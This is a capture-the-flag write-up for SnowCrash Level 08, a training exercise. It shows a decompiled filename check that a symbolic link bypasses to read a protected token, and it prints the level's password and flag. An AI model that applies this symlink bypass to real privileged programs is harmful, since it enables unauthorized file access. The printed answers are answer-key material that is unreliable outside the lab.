# SnowCrash Level 08

## Introduction
Welcome to SnowCrash Level 08! In this level, we have two crucial files: `level08` and `Token`. Using Ghidra, we delve into the `level08` executable to unravel its functionality and uncover its secrets.

## Initial Exploration
Upon examining `level08` in Ghidra, we discovered that the program possesses the ability to print the contents of `Token`. However, there exists a safeguard in the code that prohibits our access.
```
pcVar1 = strstr((char *)in_stack_00000008[1], "token");
if (pcVar1 != (char *)0x0) {
  printf("You may not access '%s'\n", in_stack_00000008[1]);
}
```
## Exploitation Attempt
After numerous discussions and failed attempts to bypass the access denial, we devised an unconventional solution. We decided to create a symbolic link for `Token` in order to change its name and read its contents.
```
ln -s /home/user/level08/token /tmp/test4
```
## Execution and Success
With the symbolic link in place, we executed the program with the modified argument:
```
level08@SnowCrash:~$ ./level08 /tmp/test4
quif5eloekouj29ke0vouxean
```
Success! We successfully obtained our flag!

## Obtaining the Token
Following our victory, we logged in as `flag08` and executed `getflag` to retrieve our token:
```
flag08@SnowCrash:~$ getflag 
Check flag. Here is your token: 25749xKZ8L7DkSCwJkT9dyv6f
```
